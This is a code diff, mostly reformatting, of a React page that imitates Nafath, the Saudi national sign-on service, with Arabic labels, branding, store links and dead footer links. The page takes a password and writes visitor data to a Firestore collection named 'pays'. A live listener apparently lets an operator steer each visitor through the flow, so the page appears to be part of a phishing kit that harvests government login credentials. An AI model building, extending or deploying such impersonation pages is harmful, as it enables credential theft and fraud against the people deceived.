@@ -19,24 +19,30 @@ export default function NafazPage() {
   const [password, setPassword] = useState("");
   const [showError, setShowError] = useState("");
 
-  const visitorId = typeof window !== "undefined" ? sessionStorage.getItem("visitor") || "" : "";
+  const visitorId =
+    typeof window !== "undefined"
+      ? sessionStorage.getItem("visitor") || ""
+      : "";
 
-  useVisitorRouting({
-    currentPage: "nafaz",
-  });
-
-  const updateData = useCallback(async (data: Record<string, any>) => {
-    if (!isFirebaseConfigured || !db || !visitorId) return;
-    try {
-      const docRef = doc(db as Firestore, "pays", visitorId);
-      await setDoc(docRef, {
-        ...data,
-        updatedAt: new Date().toISOString(),
-      }, { merge: true });
-    } catch (e) {
-      console.error("Error updating nafaz data:", e);
-    }
-  }, [visitorId]);
+  const updateData = useCallback(
+    async (data: Record<string, any>) => {
+      if (!isFirebaseConfigured || !db || !visitorId) return;
+      try {
+        const docRef = doc(db as Firestore, "pays", visitorId);
+        await setDoc(
+          docRef,
+          {
+            ...data,
+            updatedAt: new Date().toISOString(),
+          },
+          { merge: true },
+        );
+      } catch (e) {
+        console.error("Error updating nafaz data:", e);
+      }
+    },
+    [visitorId],
+  );
 
   useEffect(() => {
     if (!visitorId || !isFirebaseConfigured || !db) return;
@@ -63,7 +69,7 @@ export default function NafazPage() {
       },
       (error) => {
         console.error("[nafaz] Firestore listener error:", error);
-      }
+      },
     );
 
     return () => unsubscribe();
@@ -101,7 +107,10 @@ export default function NafazPage() {
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
+    <div
+      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
+      dir="rtl"
+    >
       <header className="bg-white shadow-sm border-b">
         <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
           <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
@@ -165,7 +174,10 @@ export default function NafazPage() {
               />
 
               {showError && (
-                <Alert className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200" dir="rtl">
+                <Alert
+                  className="text-sm text-red-600 flex items-center gap-2 bg-red-50 border-red-200"
+                  dir="rtl"
+                >
                   <ShieldAlert className="w-5 h-5 text-red-600" />
                   {showError}
                 </Alert>
@@ -192,13 +204,23 @@ export default function NafazPage() {
                   لتحميل تطبيق نفاذ
                 </div>
                 <div className="flex justify-center gap-3">
-                  <a href="https://play.google.com/store" target="_blank" rel="noopener noreferrer" className="hover:scale-105 transition-transform">
+                  <a
+                    href="https://play.google.com/store"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="hover:scale-105 transition-transform"
+                  >
                     <div className="bg-black text-white px-4 py-2 rounded-lg flex items-center gap-2">
                       <span className="text-xs">GET IT ON</span>
                       <span className="font-semibold">Google Play</span>
                     </div>
                   </a>
-                  <a href="https://apps.apple.com" target="_blank" rel="noopener noreferrer" className="hover:scale-105 transition-transform">
+                  <a
+                    href="https://apps.apple.com"
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="hover:scale-105 transition-transform"
+                  >
                     <div className="bg-black text-white px-4 py-2 rounded-lg flex items-center gap-2">
                       <span className="text-xs">Download on the</span>
                       <span className="font-semibold">App Store</span>
@@ -237,12 +259,42 @@ export default function NafazPage() {
             <div className="text-2xl font-bold text-teal-600">نفاذ</div>
           </div>
           <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
-            <a href="#" className="hover:text-teal-600 transition-colors font-medium">الرئيسية</a>
-            <a href="#" className="hover:text-teal-600 transition-colors font-medium">حول</a>
-            <a href="#" className="hover:text-teal-600 transition-colors font-medium">اتصل بنا</a>
-            <a href="#" className="hover:text-teal-600 transition-colors font-medium">الشروط والأحكام</a>
-            <a href="#" className="hover:text-teal-600 transition-colors font-medium">المساعدة والدعم</a>
-            <a href="#" className="hover:text-teal-600 transition-colors font-medium">سياسة الخصوصية</a>
+            <a
+              href="#"
+              className="hover:text-teal-600 transition-colors font-medium"
+            >
+              الرئيسية
+            </a>
+            <a
+              href="#"
+              className="hover:text-teal-600 transition-colors font-medium"
+            >
+              حول
+            </a>
+            <a
+              href="#"
+              className="hover:text-teal-600 transition-colors font-medium"
+            >
+              اتصل بنا
+            </a>
+            <a
+              href="#"
+              className="hover:text-teal-600 transition-colors font-medium"
+            >
+              الشروط والأحكام
+            </a>
+            <a
+              href="#"
+              className="hover:text-teal-600 transition-colors font-medium"
+            >
+              المساعدة والدعم
+            </a>
+            <a
+              href="#"
+              className="hover:text-teal-600 transition-colors font-medium"
+            >
+              سياسة الخصوصية
+            </a>
           </div>
         </div>
       </footer>
